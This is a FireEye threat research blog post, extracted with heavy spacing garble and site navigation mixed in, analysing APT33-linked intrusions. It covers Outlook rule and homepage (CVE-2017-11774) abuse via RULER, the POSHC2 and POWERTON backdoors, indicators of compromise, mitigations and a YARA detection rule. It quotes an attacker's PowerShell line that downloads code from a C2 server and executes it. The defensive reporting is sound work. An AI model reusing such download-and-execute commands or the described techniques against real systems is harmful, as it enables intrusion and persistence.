{
    "title": "overruled_ containing a potentially destructive adversary _ fireeye inc",
    "text": "Threat Research OVERRULED: Containing a Potentially De structive adversary Decembe r 21, 2018  | by Geoff acke rman, Rick Cole , andrew Thomp son, alex Orleans, nick Carr aPT UPDaTE (Jul. 3, 2019): On May 16, 2019 FireEye's advanced Practices team att ributed the remaining \" suspected aPT33 activity\" ( referred to as GroupB in thi s blog po st) to aPT 33, operating at the behe st of the Iranian government. The mal ware and tradecraft in thi s blog po st are consistent with the June 2019 intrusion campaign  targeting U.S. fe deral gove rnment agencie s and financial, retail, me dia, and education sectors – as well as U.S. Cybe r Comman d's July 2019 CVE-2017-11774 indicators, which FireEye also attributes to aPT33. FireEye's rigorous process for clustering and attributing thi s activity i s also explo red in this blog's \"Identifying the Ove rlap\" section. Introduction FireEye assesses aPT33 may be behin d a series of intrusions and attempte d intrusions within the enginee ring industry. Public reporting indicates this activity may be related to recent destructive attack s. FireEye's Manage d Defense has responded to and containe d numerous intrusions that we assess are related. The acto r is leveraging publicly available tool s in early phases of the int rusion; however, we have ob served them t ransition to c ustom implant s in later stage activity in an attempt to ci rcumvent o ur detection. On Sept. 20, 2017, FireEye Intelligence p ublished a blog po st detailing spear phishing activity targeting Energy and aerospace in dustries. Recent p ublic reporting indicated possible links between the confi rmed aPT33 spear phishing an d destructive SHaMOOn attacks; however, we were unable to in dependently ve rify this claim. FireEye’s advanced Practices team leve rages telemet ry and aggressive proactive ope rations to maintain visibility of aPT 33 and their attempte d intrusions against our customers. These efforts enable d us to establish an operational timeline that was consistent with multiple int rusions Manage d Defense identified and containe d prior to the acto r completing thei r mission. We co rrelated the intrusions using an inte rnally-develope d similarity engine described below. additionally, p ublic discussions have al so indicated that specific attacke r infrastructure we observed is possibly related to the recent destructive SHaMOOn attacks. Identifying the Ove rlap in Th reat activity FireEye augments our expertise with an internally-develope d similarity engine  to eval uate potential a ssociation s and relationships between groups and activity. U sing concept s from document cl ustering and topic mo deling literature, this engine p rovides a framework to calc ulate and discover similarities between groups of activitie s, and then develop inve stigative lea ds for follow-on analy sis. Our engine i dentified similarities between a series of intrusions within the enginee ring industry. The nea r real-time results led to an in- depth compa rative analy sis. FireEye analy zed all available o rganic info rmation f rom numerous intrusions and all known aPT33 activity. We subsequently concl uded, with medium confi dence, that t wo specific ea rly-phase intrusions were the work of a single group. advanced Practices then reconstructed an ope rational timeline ba sed on confi rmed aPT33 activity observed in the la st year. We compa red that to the timeline of the containe d intrusions and determined there were circumstantial ove rlaps to include remarkable similarities in tool selection during specified timeframes. We assess with low confidence that the int rusions were conducted by aPT 33. This blog contain s original source material only, whereas Finished Intelligence incl uding an all- source analy sis is available within our intelligence portal. To best understand the techniq ues employe d by the a dversary, it is necessary to provide backg round on our Manage d Defense response to thi s activity during thei r 24x7 monito ring. Manage d Defense Rapid Responses: Investigating the attacke r In mid-novembe r 2017, Manage d Defense identified and responded to targeted threat activity at a c ustomer within the enginee ring industry. The a dversary leveraged stolen credentials and a publicly available tool, SensePost’s RULER, to config ure a client- side mail rule crafted to download and execute a malicio us payloa d from an a dversary-controlled WebDaV server 85.206.161[.]214@443\\outlook\\live.exe (MD5: 95f3bea43338 addc1ad951cd2d42eb6f). The payloa d was an autoIT downloader that retrieved and executed additional Po werShell from hxxps://85.206.161[.]216:8080/HomePage.htm . The follo w-on PowerShell profiled the target system’s architecture, downloaded the app ropriate variant of Po werSploit (MD 5: c326f15665 7d1c41a9c387415bf779d4 or 0564706ec38d15 e981f71eaf474 d0ab8), and reflectively loa ded PUPYRaT (MD 5: 94cd86a0a4d747472c2b3f1bc3279d77 or 17587668aC577FCE0B278420B8EB72aC). The acto r leveraged a publicly available exploit fo r CVE-2017-0213  to escalate p rivileges, publicly available Win dows SysInternals PROCDUMP to dump the LSaSS p rocess, and publicly available M IMIKaTZ to p resumably steal additional credentials. Manage d Defense aided the victim in containing the int rusion. FireEye collecte d 168 PUPYRaT samples for a compa rison. While impo rt hashes (IMPHaSH) are insufficient fo r attribution, we found it remarkable that o ut of the specified sampling, the acto r’s IMPHaSH was found in only six samples, two of which were confirmed to belong to the th reat acto r observed in Manage d Defense, and one which is attributed to aPT 33. We also determined aPT33 likely transitioned from PowerShell EMPIRE to PUPYRaT during this timeframe. In mid-July of 2018 , Manage d Defense identified similar targeted threat activity foc used against the same industry. The acto r leveraged stolen credentials and RULER’s module that exploit s CVE-2017-11774 (RULER.HOMEPaGE), modifying n umerous users’ Outlook client homepage s for code execution and persistence. These metho ds are further explored in this post in the \"RUL ER In-The-Wil d\" section. The acto r leveraged this persistence mechani sm to download and execute OS-dependent variants of the publicly available . nET POSHC2 backdoor as well as a newly identified PowerShell-ba sed implant self-name d POWERTOn. Manage d Defense rapidly engage d and successfully containe d the intrusion. Of note, a dvanced Practices separately established that aPT 33 began using POS HC2 as of at lea st July 2, 2018 , and continued to use it throughout the duration of 2018 . During the J uly activity, Manage d Defense observed three variations of the homepage exploit ho sted at hxxp://91.235.116[.]212/index.html . One example i s shown in Fig ure 1. Figure 1: attacke r’s homepage exploit (CV E-2017-11774) The main enco ded payloa d within each exploit leve raged WMIC to con duct system profiling in o rder to determine the app ropriate OS- dependent POS HC2 implant an d dropped to disk a PowerShell script name d “Media.ps1” within the user’s %LOCALAPPDATA%  directory (%LOCALAPPDATA%\\MediaWs\\Media.ps1 ) as shown in Fig ure 2.   Email Up dates Information an d insight on to day's advanced threats from FireEye. SHaRE Recent Po sts 16 Mar 2020 09 Mar 2020 24 Feb 2020 RSS FEED: STaY CO nnECTEDFirst name Last name Email address Company name Threat Research Blog FireEye Stories Blog Industry Perspective s Blog Yes, I would like to receive communication s from FireEye. Please read more about our information collection an d use. SUBSCR IBE They Come in the night: Ransomware Deployment T rends  Crescendo: Real Time Event Vie wer for macOS   Ransomware again st the Machine: How adversaries are Learning to Disrupt Industrial Production by Targeting IT and OT   Home  FireEye Blog s Threat Research  OVERRULED: Containing a Potentially De structive a d...    COnTaCT US  REPORT a n InCIDEnT Solutions Services Customers Partners Resources Company  Figure 2: attacke r’s “Media.ps1” script The purpose of “Media.ps1 ” was to decode and execute the downloaded binary payloa d, which was written to disk as “C:\\Users\\Public\\Downloads\\log.dat ”. at a late r stage, thi s PowerShell script would be config ured to persist on the ho st via a registry Run key. analysis of the “log.dat ” payloa ds determined them to be va riants of the p ublicly available POS HC2 proxy- aware stager written to download and execute PowerShell payloa ds from a ha rdcoded comman d and control (C2) address. These particular POSHC2 samples run on the . nET framework and dynamically loa d payloa ds from Base64 encoded strings. The implant will send a reconnai ssance report via HTTP to the C 2 server (hxxps://51.254.71[.]223/images/static/content/ ) and subsequently eval uate the response as PowerShell source code. The reconnai ssance report contain s the follo wing info rmation: Username an d domain Computer name CPU details Current exe P ID Configured C2 server The C2 messages are encrypted via aES using a ha rdcoded key an d encoded with Base64. It is this POSHC2 binary that e stablished persistence fo r the afo rementione d “Media.ps1 ” PowerShell script, which then decodes and executes the POS HC2 binary upon system startup. During the i dentified July 2018  activity, the POS HC2 variants were config ured with a kill date of J uly 29, 2018 . POSHC2 was leveraged to download and execute a new PowerShell-ba sed implant self-name d POWERTOn (hxxps://185.161.209[.]172/api/info ). The adversary had limited success with interacting with POW ERTOn during this time.  The acto r was able to download and establish persistence fo r an autoIt binary name d “ClouldPackage.exe ” (MD5: 46038 aa5b21b940099 b0db413fa6268 7), which was achieve d via the POW ERTOn “persist” comman d. The sole functionality of “ ClouldPackage.exe ” was to exec ute the follo wing line of Po werShell code: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $webclient = new- object System.Net.WebClient; $webclient.Credentials = new-object System.Net.NetworkCredential('public', 'fN^4zJp{5w#K0VUm}Z_a!QXr*]&2j8Ye'); iex $webclient.DownloadString('hxxps://185.161.209[.]172/api/default') The purpose of this code is to retrieve “silent mo de” POW ERTOn from the C 2 server. note the acto r protected their follow-on payloa ds with strong credentials. Shortly after this, Manage d Defense containe d the intrusion. Starting app roximately th ree weeks later, the acto r reestablished access through a successful password spray. Manage d Defense imme diately identified the acto r deploying malicio us homepage s with RUL ER to pe rsist on workstations. They ma de some inf rastructure and tooling change s to include additional laye rs of obfuscation in an attempt to avoi d detection. The acto r hosted their homepage exploit at a ne w C2 server (hxxp://5.79.66[.]241/index.html ). at lea st three new variations of “index.html ” were identified during this period. Two of the se variations containe d encoded PowerShell co de written to download new OS-dependent variants of the . nET POSHC2 binaries, as seen in Fig ure 3. Figure 3: OS-specific POS HC2 Downloader Figure 3 shows that the acto r made some mino r change s, such as encoding the Po werShell \"DownloadString \" comman ds and renaming the resulting POS HC2 and .ps1 files dropped to disk. Once decoded, the comman ds will attempt to download the POS HC2 binaries from yet anothe r new C2 server (hxxp://103.236.149[.]124/delivered.dat ). The name of the .p s1 file dropped to decode and execute the POSHC2 variant also change d to “Vision.ps1 ”.  During this august 2018  activity, the POS HC2 variants were configured with a “kill date” of a ug. 13, 2018 . note that POS HC2 supports a kill date in o rder to guardrail an intrusion by time an d this functionality i s built into the f ramework. Once again, POS HC2 was used to download a new variant of POW ERTOn (MD5: c38069d0 bc79acdc28af3820 c1123e53), config ured to comm unicate with the C 2 domain hxxps://basepack[.]org . at one point in late-a ugust, after the POS HC2 kill date, the a dversary used RULER.HOMEPaGE to directly download POWERTOn, bypassing the inte rmediary stages previously observed. Due to Manage d Defense’s early containment of the se intrusions, we were unable to a scertain the acto r’s motivation s; however, it was clear they were adamant abo ut gaining an d maintaining acce ss to the victim’ s network. adversary Pursuit: Infrastructure Monito ring advanced Practices conducts aggressive proactive ope rations in order to identify an d monito r adversary infrastructure at scale. The a dversary maintaine d a RULER.HOMEPaGE payloa d at hxxp://91.235.116[.]212/index.html  between July 16 and Oct. 11, 2018 . On at lea st Oct. 11, 2018 , the adversary change d the payloa d (MD5: 8be06571e915ae3f76901d52068 e3498) to download and execute a POW ERTOn sample f rom hxxps://103.236.149[.]100/api/info  (MD5: 4047e238bbcec147f8b97d849ef40ce5). This specific URL was identified in a public discussion as possibly related to recent destructive attack s. We are unable to independently ve rify this correlation with any o rganic info rmation we possess. On Dec. 13, 2018 , advanced Practices proactively i dentified and attributed a malicio us RULER.HOMEPaGE payload hosted at hxxp://89.45.35[.]235/index.html  (MD5: f0fe6e9dde99890 7af76d91ba8f68a05). The payload was crafted to download and execute POW ERTOn hosted at hxxps://staffmusic[.]org/transfer/view (MD5: 53ae59ed03fa5df3bf738bc0775a91d9). Table 1 contain s the ope rational timeline fo r the activity we analy zed. DaTE/TIME (UTC)nOTE InDICaTOR 2017-08-15 17:06:59aPT33 – EMPIRE (Used) 8a9962 4d224ab3378598 b9895660 c890 2017-09-15 16:49:59aPT33 – PUPYRaT (Compile d)4b19bccc25750f49c2c1bb462509 f84e 2017-11-12 20:42:43Groupa – aUT 2EXE Downloader (Compile d)95f3bea43338 addc1ad951 cd2d42eb6f 2017-11-14 14:55:14Groupa – PUPYRaT (U sed)17587668ac577fce0b278420b8eb72ac 2018 -01-09 19:15:16aPT33 – PUPYRaT (Compile d)56f5891f065494fdbb2693 cfc9bce9ae  2018 -02-13 13:35:06aPT33 – PUPYRaT (U sed) 56f5891f065494fdbb2693 cfc9bce9ae 2018 -05-09 18:28:43GroupB – aUT 2EXE (Compile d)46038 aa5b21b940099 b0db413fa6268 7 2018 -07-02 07:57:40aPT33 – POSHC2 (Used) fa7790abe9ee40556 fb3c5524388d e0b 2018 -07-16 00:33:01GroupB – POS HC2 (Compile d)75e680d5 fddbdb989812 c7ba83e7c425 2018 -07-16 01:39:58GroupB – POS HC2 (Used) 75e680d5 fddbdb989812 c7ba83e7c425 2018 -07-16 08:36:13GroupB – POW ERTOn (Used)46038 aa5b21b940099 b0db413fa6268 7 2018 -07-31 22:09:25aPT33 – POSHC2 (Used) 129c296c363b6d9d a0102 aa03878ca7f 2018 -08-06 16:27:05GroupB – POS HC2 (Compile d)fca0ad319 bf8e63431eb468603d50 eff 2018 -08-07 05:10:05GroupB – POS HC2 (Used) 75e680d5 fddbdb989812 c7ba83e7c425 2018 -08-29 18:14:18aPT33 – POSHC2 (Used) 5832 f708fd860 c88cbdc088acecec4ea 2018 -10-09 16:02:55aPT33 – POSHC2 (Used) 8d3fe1973183e1d3b0dbec31be8ee9dd 2018 -10-09 16:48:09aPT33 – POSHC2 (Used) 48d1ed9870ed40c224e50a11bf3523 f8 2018 -10-11 21:29:22GroupB – POW ERTOn (Used)8be06571e915ae3f76901d52068 e3498 2018 -12-13 11:00:00GroupB – POW ERTOn (Identified)99649d58 c0d502 b2dfada0212 4b1504c Table 1: Operational Timeline Outlook an d Implication s If the activitie s observed during these intrusions are linked to aPT 33, it would suggest that aPT 33 has likely maintaine d proprietary capabilitie s we had not previously observed until sustained pressure from Manage d Defense forced their use. FireEye Intelligence ha s previously reported that aPT 33 has ties to destructive malware, and they po se a heightene d risk to critical inf rastructure. This risk is pronounced in the ene rgy sector, which we consistently ob serve them ta rget. That ta rgeting align s with Iranian national p riorities for economic growth and competitive a dvantage, e specially relating to pet rochemical p roduction. We will contin ue to track the se clusters independently until we achieve high confi dence that they a re the same. The ope rators behind each of the described intrusions are using publicly available b ut not widely understood tools and techniq ues in addition to p roprietary implant s as needed. Manage d Defense has the privilege of being exposed to intrusion activity eve ry day across a wide spectrum of industries and adversaries. This daily front line experience is backed by advanced Practices, FireEye Labs advanced Reverse Engineering (FLaR E), and FireEye Intelligence to give o ur clients every advantage they can have again st sophisticated adversaries. We welcome a dditional o riginal source information we can eval uate to confi rm or refute our analytical j udgement s on attribution. Custom Back door: POWERTOn POWERTOn is a back door written in Po werShell; Fi reEye has not yet i dentified any publicly available tool set with a similar code base, indicating that it i s likely custom-built. POW ERTOn is designed to support multiple persistence mechani sms, including WMI and auto-run registry key. Comm unication s with the C 2 are over TCP/HTTP(S) an d leverage aES encryption fo r communication t raffic to an d from the C 2. POWERTOn typically gets deployed as a later stage back door and is obfuscated several layers. FireEye has witnessed at least two separate versions of POW ERTOn, tracked separately as POWERTOn.v1 and POWERTOn.v2, wherein the latte r has improved its comman d and control functionality, an d integrated the ability to dump password hashes. Table 2 contain s samples of POW ERTOn. Hash of Obf uscated File (MD 5) Hash of Deobf uscated File (MD 5) Version 974b999186 ff434bee3ab6d61 411731f3871aac486ba79215f2155f32d581d c2 V1 e2d60 bb6e3e67591e13b6a8178d89 7362cd286 711151efb61a15e2e11736d7d2 V1 bd80fcf5e70a0677ba94b3f7c011440e5a66480e100d 4f14e12fceb60e91371d V1 4047e238bbcec147f8b97d849ef40ce5f5ac89d406e698e169ba34fea59a780eV2 c38069d0 bc79acdc28af3820 c1123e53 4aca006b9afe85b1f11314b39ee270f7 V2 n/a 7f4f7e307a11f121d8659 ca98bc8ba56 V2 53ae59ed03fa5df3bf738bc0775a91d9 99649d58 c0d502 b2dfada0212 4b1504cV2 Table 2: POWERTOn malware samples adversary Metho ds: Email Exploitation on the Ri se Outlook an d Exchange a re ubiquitous with the concept of email acce ss. User convenience i s a primary driver behind technological a dvancement s, but convenient acce ss for users often reveals additional attack surface for adversaries. as organizations expose any email server access to the p ublic inte rnet for its users, those systems become int rusion vecto rs. FireEye has observed an increase in targeted adversaries challenging an d subverting security cont rols on Exchange an d Office365. Our Mandiant con sultants also presented several new metho ds used by adversaries to subvert multifactor authentication  at FireEye Cybe r Defense Summit 2018 . at FireEye, our decisions are data driven, but data provided to us is often incomplete an d missing piece s must be inferred based on our expertise in order for us to respond to intrusions effectively. a pla usible scenario for exploitation of thi s vector is as follows. an adversary has a single pai r of valid credentials for a user within yo ur organization obtaine d through any means, to incl ude the follo wing non-exha ustive example s: Third party breaches where your users have re-used credentials; does your enterprise leverage a naming standard for email a ddresses such as first.last@yourorganization.tld? It is possible that a user within yo ur organization ha s a personal email a ddress with a first and last name--an d an affiliate d password-- compromised in a thi rd-party breach somewhere. Did they re-use that pa ssword? Previous compromise within yo ur organization where credentials were comp romised but not identified or reset. Poor password choice o r password security policie s resulting in b rute-forced credentials. Gathering of c rackable pa ssword hashes from various other sources, such as nTLM ha shes gathered via documents intended to phish them f rom users. Credential ha rvesting phi shing scams, where harvested credentials may be sold, re-used, or documented permanently el sewhere on the inte rnet.  Once the a dversary has legitimate c redentials, they identify p ublicly acce ssible Outlook Web acce ss (OWa) o r Office 365 that is not protected with multi-facto r authentication. The a dversary leverages the stolen credentials and a tool like RUL ER to deliver exploit s through Exchange’ s legitimate feat ures. RULER In-The-Wil d: Here, There, and Everywhere SensePost’s RULER is a tool designed to inte ract with Exchange servers via a me ssaging application programming inte rface (MaP I), or via remote p rocedure calls (RPC), both ove r HTTP protocol. a s detailed in the \"Manage d Defense Rapid Responses\" section, in mi d-novembe r 2017, FireEye witnessed network activity generated by an exi sting Outlook email client p rocess on a single ho st, indicating connection via Web Di stributed authoring and Versioning (WebDaV) to an a dversary-controlled IP address 85.206.161[.]214.  This communication retrieved an exec utable created with aut2Exe (MD5: 95f3bea43338 addc1ad951cd2d42eb6f), and executed a PowerShell one-line r to retrieve further malicio us content. Without the requisite logging f rom the impacte d mailbox, we can still assess that thi s activity was the result of a malicious mail rule created using the afo rementione d tooling fo r the follo wing reasons: Outlook.exe directly requested the malicio us executable ho sted at the a dversary IP address over WebDaV. This is unexpecte d unless some feat ure of Outlook directly was exploite d; traditional vecto rs like phi shing would show a process ancestry where Outlook spawned a child process of an Office p roduct, acrobat, o r something similar. Process injection would imply p rior malicio us code execution on the ho st, which evi dence did not support. The transfer of 95f3bea43338 addc1ad951cd2d42eb6f was over WebDaV. RUL ER facilitate s this by exposing a simple WebDaV server, and a comman d line mo dule for creating a client- side mail rule to point at that WebDaV ho sted payloa d. The choice of WebDaV fo r this initial transfer of stager is the result of restrictions in mail rule creation; the payload must be \"locally\" acce ssible befo re the rule can be saved, meaning p rotocol han dlers for something like HTTP or FTP are not pe rmitted. This is thoroughly detailed in Silent B reak Sec urity's initial write-up prior to RULER’s creation. Thi s leaves SMB an d WebDaV via U nC file pathing a s the available option s for transferring your malicio us payloa d via an O utlook Rule. WebDaV i s likely the le ss alerting option f rom a networking pe rspective, a s one is more likely to fin d WebDaV t ransactions occurring ove r ports 80 and 443 to the inte rnet than they a re to find a domain joine d host comm unicating via SMB to a non- domain joine d host at an a rbitrary IP address. The payloa d to be exec uted via Outlook client- side mail rule must contain no a rguments, which is likely why a compile d aut2exe exec utable was chosen. 95f3bea43338 addc1ad951cd2d42eb6f does nothing b ut execute a PowerShell one-line r to retrieve additional malicio us content fo r execution. However, execution of thi s comman d natively using an O utlook rule was not po ssible due to thi s limitation. With that in min d, the initial infection vecto r is illustrated in Figure 4. Figure 4: Initial infection vecto r as both attacke rs and defenders continue to explo re email security, publicly-released techniq ues and exploit s are quickly adopted. SensePost's identification an d responsible disclosure of CV E-2017-11774 was no different. For an excellent description of ab using Outlook's home page fo r shell and persistence from an attacke r’s perspective, refer to Sen sePost's blog . FireEye has observed and documented an uptick in several malicio us attacke rs' usage of thi s specific home page exploitation techniq ue. Based on our experience, thi s particular metho d may be mo re successful due to defenders misinterpreting artifacts and focusing on inco rrect mitigation s. This is understandable, as some defenders may first learn of successful CVE-2017-11774 exploitation when observing Outlook spawning processes resulting in malicio us code execution. When thi s observation i s combine d with standalone fo rensic artifacts that may look similar to malicio us HTML application (.hta) attachment s, the evi dence may be mi sinterpreted as initial infection via a phi shing email. Thi s incorrect assumption ove rlooks the fact that attacke rs require valid credentials to deploy CV E-2017-11774, an d thus the scope of the comp romise may be g reater than in dividual users' Outlook clients where home page pe rsistence is discovered. To assist defenders, we're including a Ya ra rule to differentiate the se Outlook home page payloa ds at the en d of this post. Understanding this nuance further highlight s the expo sure to thi s techniq ue when combine d with password spraying a s documented with this attacke r, and underscores the impo rtance of laye red email security defenses, including multi-facto r authentication an d patch management. We recommen d the organizations reduce their email attack surface as much as possible. Of note, o rganizations that choo se to ho st their email with a clo ud service provider must still ensure the software clients used to acce ss that server are patche d. Beyon d implementing m ulti-facto r authentication fo r Outlook 365/Exchange acce ss, the Mic rosoft security updates in Table 3 will assist in mitigating kno wn and documented attack vecto rs that are exposed for exploitation by toolkits such as SensePost’s RULER. Microsoft Outlook Sec urity Update RULER Module addressed June 13, 2017 Security Update RULER.RULES Septembe r 12, 2017 Security Update RULER.FORMS Octobe r 10, 2017 Security Update RULER.HOMEPaGE Table 3: Outlook attack surface mitigation s Detecting the Techniq ues FireEye detected this activity ac ross our platform, including name d detection fo r POSHC2, PUPYRaT, an d POWERTOn. Table 4 contain s several specific detection name s that applie d to the email exploitation an d initial infection activity. PLaTFORM SIGnaTURE naME Endpoint Sec urityPOWERSHELL EnCODED REMOTE DOWnLOaD (M ETHODOLOGY) SUSPICIOUS POW ERSHELL USaG E (METHODOLOGY) MIMIKaTZ (CR EDEnTIaL STEaLER) RULER OUTLOOK P ERSISTEnCE (UTILITY) network and Email Sec urityFE_Exploit_HTML_CV E201 711774 FE_HackTool_Win_RUL ER FE_HackTool_Lin ux_RULER FE_HackTool_OSX_RUL ER FE_Trojan_OL E_RULER HackTool.RUL ER (network Traffic) Table 4: Fi reEye product detection s For organizations interested in hunting fo r Outlook home page shell and persistence, we’ve incl uded a Yara rule that can al so be used for context to differentiate the se payloa ds from othe r scripts: rule Hunting_Outlook_Homepage_Shell_and_Persistence { meta:         author = \"Nick Carr (@itsreallynick)\"         reference_hash = \"506fe019d48ff23fac8ae3b6dd754f6e\"   PREVIOUS POST nEXT POST    strings:         $script_1 = \"<htm\" ascii nocase wide         $script_2 = \"<script\" ascii nocase wide         $viewctl1_a = \"ViewCtl1\" ascii nocase wide         $viewctl1_b = \"0006F063-0000-0000-C000-000000000046\" ascii wide         $viewctl1_c = \".OutlookApplication\" ascii nocase wide     condition:         uint16(0) != 0x5A4D and all of ($script*) and any of ($viewctl1*) } acknowledgement s The authors would like to thank Matt Be rninger for providing data science support for attribution augmentation projects, Omar Sardar (FLaR E) for reverse enginee ring POW ERTOn, and Joseph Reye s (FireEye Labs) for continued comprehensive Outlook client exploitation p roduct cove rage.   Company Why Fi reEye? Customer Stories Careers Certification s and Compliance Investor Relation s Supplier Documents news and Events newsroom Press Releases Webina rs Events awards and Honors Email Preferences Technical S upport Incident? Report Security Issue Contact S upport Customer Portal Communities Documentation Po rtal FireEye Blog s Threat Research FireEye Stories Industry Perspective s Threat Map View the Late st Threats Contact U s +1 877-347-3393   Stay Connecte d  Copyright   2020  FireEye, Inc. all rights reserved.  Privacy & Cookie s Policy  | Privacy Shiel d | Legal Doc umentationSite Lang uage English  "
}